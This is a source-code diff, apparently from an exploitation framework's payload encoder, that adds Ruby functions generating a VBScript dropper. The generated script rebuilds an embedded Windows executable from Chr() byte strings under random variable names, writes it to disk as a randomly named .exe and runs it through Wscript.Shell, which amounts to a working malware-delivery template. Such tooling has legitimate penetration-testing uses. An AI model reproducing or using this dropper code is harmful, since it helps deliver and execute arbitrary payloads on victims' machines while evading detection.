@@ -745,6 +745,42 @@ module Text
 		to_exe_vba(to_win32pe(code, note))
 	end
 
+	def self.to_exe_vbs(exe = '')
+		vbs = ""
+
+		var_bytes = rand_text_alpha(rand(8)+8)
+		var_fname = rand_text_alpha(rand(8)+8)
+		var_func = rand_text_alpha(rand(8)+8)
+		var_stream = rand_text_alpha(rand(8)+8)
+		var_obj = rand_text_alpha(rand(8)+8)
+		var_shell = rand_text_alpha(rand(8)+8)
+
+		vbs << "Function #{var_func}()\r\n"
+
+		vbs << "#{var_bytes} = Chr(&H#{("%02x" % exe[0])})"
+		
+		1.upto(exe.length) do |byte|
+			vbs << "&Chr(&H#{("%02x" % exe[byte])})" 
+		end	
+		vbs << "\r\n"
+		
+		vbs << "Dim #{var_obj}\r\n"
+		vbs << "Set #{var_obj} = CreateObject(\"Scripting.FileSystemObject\")\r\n"
+		vbs << "Dim #{var_stream}\r\n"
+		vbs << "Set #{var_stream} = #{var_obj}.CreateTextFile(\"#{var_fname}.exe\")\r\n"
+		vbs << "#{var_stream}.Write #{var_bytes}\r\n"
+		vbs << "#{var_stream}.Close\r\n"
+		vbs << "Dim #{var_shell}\r\n"
+		vbs << "Set #{var_shell} = CreateObject(\"Wscript.Shell\")\r\n"
+		vbs << "#{var_shell}.run(\"#{var_fname}.exe\")\r\n"
+		vbs << "End Function\r\n"
+		vbs << "#{var_func}\r\n"
+	end
+
+	def self.to_win32pe_vbs(code = "\xcc", note="")
+		to_exe_vbs(to_win32pe(code, note))
+	end
+
 	# Creates a .NET DLL which loads data into memory
 	# at a specified location with read/execute permissions
 	#    - the data will be loaded at: base+0x2065
